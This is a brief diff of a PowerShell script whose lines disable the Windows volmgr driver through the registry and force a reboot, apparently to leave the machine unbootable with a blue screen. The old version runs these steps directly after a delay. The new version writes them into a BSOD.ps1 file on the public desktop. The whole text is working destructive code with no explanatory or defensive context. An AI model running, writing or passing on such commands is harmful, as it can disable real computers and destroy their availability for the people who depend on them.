@@ -1,3 +1,2 @@
-﻿sleep 300
-Set-ItemProperty -Path "HKLM:\System\ControlSet001\Services\volmgr" -name Start -Value 4
-shutdown /r /t 30 /f
+﻿write-output 'Set-ItemProperty -Path HKLM:\System\ControlSet001\Services\volmgr -name Start -Value 4' >> C:\Users\Public\Desktop\BSOD.ps1
+write-output "shutdown /r /t 30 /f" >> C:\Users\Public\Desktop\BSOD.ps1
